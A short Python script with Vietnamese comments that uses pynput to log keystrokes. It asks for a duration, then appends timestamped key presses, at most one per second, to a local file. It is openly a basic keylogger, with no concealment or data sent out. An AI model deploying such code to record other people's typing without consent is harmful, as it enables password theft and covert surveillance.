from pynput import keyboard
import datetime
import time

def key_logger():
    # Nhập thời gian giám sát (tính bằng giây)
    duration = int(input("Nhập thời gian giám sát (giây): "))
    start_time = time.time()  # Thời gian bắt đầu

    last_logged_time = start_time  # Thời gian ghi log ban đầu

    with open("key_log.txt", "a", encoding="utf-8") as log_file:

        def on_press(key):
            nonlocal last_logged_time  # Cho phép sử dụng và cập nhật biến từ phạm vi ngoài

            current_time = time.time()
            # Kiểm tra xem thời gian giám sát đã hết chưa
            if current_time - start_time >= duration:
                print("Thời gian giám sát đã hết.")
                return False  # Dừng listener khi hết thời gian

            try:
                # Kiểm tra nếu phím có thuộc tính char (dành cho các phím thông thường)
                if hasattr(key, 'char') and key.char is not None:
                    # Chỉ ghi log nếu đã qua ít nhất 1 giây
                    if current_time - last_logged_time >= 1:
                        log_file.write(f"{datetime.datetime.now()} - Phím {key.char} đã được nhấn.\n")
                        last_logged_time = current_time  # Cập nhật thời gian ghi lại
                else:
                    # Xử lý các phím đặc biệt
                    if current_time - last_logged_time >= 1:
                        log_file.write(f"{datetime.datetime.now()} - Phím đặc biệt {key} đã được nhấn.\n")
                        last_logged_time = current_time  # Cập nhật thời gian ghi lại
            except Exception as e:
                print(f"Lỗi: {e}")

        def on_release(key):
            pass  # Hàm này có thể để trống nếu bạn không cần xử lý khi phím được thả ra

        # Cài đặt listener để lắng nghe các sự kiện nhấn và thả phím
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

# Chạy hàm key_logger
key_logger()
